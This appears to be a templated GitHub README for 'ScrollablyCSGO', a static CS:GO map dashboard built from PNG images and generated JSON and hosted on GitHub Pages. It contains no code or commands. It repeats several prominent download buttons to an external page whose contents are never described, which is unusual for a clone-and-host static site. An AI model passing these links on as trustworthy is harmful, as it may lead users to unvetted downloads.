# ScrollablyCSGO v2026 - Game Script Utility 2026

> A browser-first CS:GO dashboard for Counter-Strike: Global Offensive, built to present maps and generate pages from JSON data.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-browser-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michael-reed2005/scrollablycsgo-script-utility?style=flat-square)](https://github.com/michael-reed2005/scrollablycsgo-script-utility)

---

<p align="center">
  <a href="https://michael-reed2005.github.io/scrollablycsgo-script-utility/">
    <img src="https://img.shields.io/badge/Download-ScrollablyCSGO%20Script-brightgreen?style=for-the-badge" alt="Download ScrollablyCSGO Script">
  </a>
</p>

> **[Direct Download - ScrollablyCSGO](https://michael-reed2005.github.io/scrollablycsgo-script-utility/)**

---

[Download Latest Build](https://michael-reed2005.github.io/scrollablycsgo-script-utility/)

---

## What it does

ScrollablyCSGO provides a static, browser-accessible dashboard for Counter-Strike: Global Offensive with a strong focus on map content. The project organizes map visuals into HTML pages and relies on PNG assets plus JSON output to build the final experience. Because it is intended for GitHub Pages style hosting, it can be published as a straightforward static site and opened directly in the browser.

The process is intentionally lightweight: prepare map images, run a precompute step to produce structured data, then deploy the resulting map pages. That makes it a practical choice when you want a CS:GO web dashboard that can be updated through simple file replacement instead of a more complex application.

## Script Features

- Browser-based dashboard layout for CS:GO map presentation
- Manual import flow for map PNG files
- Precompute script for generating JSON output
- Map-specific dashboard files for organized content
- HTML-first structure for easy static hosting
- GitHub Pages deployment support
- JSON and PNG asset workflow
- Designed around Counter-Strike: Global Offensive map data

## Setup

1. Download or clone the repository.
2. Place the project in the suggested folder if you want to keep the structure consistent: `ScrollablyCSGO`.
3. Add or replace the map PNG files you want to use.
4. Run the precompute step to generate the JSON files used by the dashboard.
5. Upload the HTML, JSON, and PNG files to your GitHub Pages branch or hosting location.

A simple local workflow may look like this:

1. Update the map images in the asset folder.
2. Rebuild the JSON data.
3. Open the HTML dashboard in a browser or publish it through GitHub Pages.

## Options

| Setting | Purpose | Typical Value |
| --- | --- | --- |
| Map PNG source | Selects the image used for a specific map | Manual import |
| JSON output | Stores generated dashboard data | Precompute result |
| Dashboard file | Defines the map page to open in the browser | Map-specific HTML |
| Hosting target | Where the static files are published | GitHub Pages |
| Asset format | Supported content for visuals and data | PNG / JSON |

Example folder pattern:

- `index.html`
- `maps/`
- `data/`
- `assets/`

## Compatibility

ScrollablyCSGO is meant for browser use and static deployment. It centers on Counter-Strike: Global Offensive content and HTML dashboard pages, with PNG images and JSON data acting as the supporting file types.

Known limitations:

- It depends on the provided map files and generated JSON structure.
- It is not a full game client or live in-game overlay.
- Rendering and layout behavior may vary by browser.
- Map coverage is determined by the files you add and publish.

## FAQ

**How do I update the dashboard?**  
Swap in the map PNG files, rerun the JSON generation step, and publish the refreshed static files.

**Do I need a build step?**  
Yes. The workflow includes a precompute script that creates the JSON data consumed by the dashboard.

**Can I customize the maps?**  
Yes. Since the project uses manual PNG import, you can replace map artwork with other images whenever needed.

**Where should I host it?**  
GitHub Pages is the intended deployment path, but any static host that serves HTML, JSON, and PNG files should work.

**What file types does it use?**  
The main formats are HTML for the dashboard, JSON for generated data, and PNG for map visuals.

**Can I keep the files in a different folder?**  
Yes, but the structure should stay consistent with the paths expected by the dashboard and precompute output.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
